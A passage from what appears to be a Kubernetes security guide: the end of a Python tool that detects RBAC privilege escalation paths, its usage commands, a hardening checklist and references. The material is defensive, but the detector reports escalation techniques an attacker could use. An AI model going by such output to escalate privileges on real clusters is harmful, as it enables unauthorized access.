        key=lambda ep: risk_order.index(ep.risk),
    )

    if sorted_paths:
        for ep in sorted_paths:
            color = colors.get(ep.risk, reset)
            print(
                f"\n  {color}[{ep.risk.value}]{reset} "
                f"{ep.subject_kind}/{ep.subject_name}"
            )
            print(f"  Path:       {' → '.join(ep.path)}")
            print(f"  Description:{ep.description}")
            print(f"  Technique:  {ep.technique}")
            print(f"  Mitigation: {ep.mitigation}")
    else:
        print("  No escalation paths detected")

    if result.orphaned_bindings:
        print("\n[Orphaned Bindings]")
        for ob in result.orphaned_bindings:
            print(f"  - {ob}")

    print("\n" + "=" * 70)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Kubernetes RBAC privilege escalation path detection tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic analysis (text output)
  %(prog)s

  # JSON output (CI/CD integration)
  %(prog)s --format json

  # Filter CRITICAL paths only
  %(prog)s --format json | jq '.escalation_paths[] | select(.risk == "CRITICAL")'

  # Check paths for a specific service account
  %(prog)s --format json | jq '.escalation_paths[] | select(.subject | contains("my-sa"))'
        """,
    )
    parser.add_argument(
        "--format",
        choices=["text", "json"],
        default="text",
        help="Output format (default: text)",
    )
    parser.add_argument(
        "--kubeconfig",
        help="Path to kubeconfig file (default: ~/.kube/config)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.kubeconfig:
        import os
        os.environ["KUBECONFIG"] = args.kubeconfig

    result = analyze_rbac()
    print_rbac_report(result, args.format)

    critical_count = sum(
        1 for ep in result.escalation_paths
        if ep.risk == EscalationRisk.CRITICAL
    )
    return 1 if critical_count > 0 else 0


if __name__ == "__main__":
    sys.exit(main())
```

### Tool Usage

```bash
# Basic analysis
python rbac_escalation_detector.py

# JSON output
python rbac_escalation_detector.py --format json

# Filter CRITICAL paths only
python rbac_escalation_detector.py --format json | \
  jq '.escalation_paths[] | select(.risk == "CRITICAL")'

# Check cluster-admin bindings
python rbac_escalation_detector.py --format json | \
  jq '.cluster_admin_subjects'

# Use a specific kubeconfig
python rbac_escalation_detector.py --kubeconfig /path/to/kubeconfig

# Use in CI/CD pipeline (fail on CRITICAL findings)
python rbac_escalation_detector.py || echo "RBAC security issue found!"
```

---

## Defense Summary

### Kubernetes Security Hardening Checklist

```
Authentication/Authorization:
☐ Apply principle of least privilege for RBAC
☐ Minimize cluster-admin bindings
☐ Disable service account token auto-mount
☐ Regularly clean up old/unused ClusterRoleBindings

etcd:
☐ Enable etcd encryption (EncryptionConfiguration)
☐ Isolate etcd port (2379) with a firewall
☐ Control etcd client certificate access
☐ Store etcd backups encrypted

Network:
☐ Enforce kubelet API (10250) authentication (anonymous-auth: false)
☐ Do not expose API server externally
☐ Enforce Dashboard authentication or remove it
☐ Restrict inter-Pod communication using NetworkPolicy

Runtime:
☐ Apply Pod Security Standards (Restricted level)
☐ Block privileged containers (OPA Gatekeeper)
☐ Prohibit hostPID, hostNetwork, hostIPC
☐ Restrict hostPath mounts
☐ Prohibit running containers as root

Monitoring:
☐ Deploy Falco for runtime anomaly detection
☐ Enable API server audit logging
☐ Monitor etcd access
☐ Set up RBAC change alerts
```

---

## References

- [Kubernetes RBAC Documentation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [Microsoft Kubernetes Threat Matrix](https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
- [NCC Group Kubernetes Pentest Methodology](https://github.com/averonesis/pentest-kubernetes)
- [Bad Pods: Kubernetes Pod Privilege Escalation](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [CVE-2018-1002105](https://nvd.nist.gov/vuln/detail/CVE-2018-1002105)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [NSA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
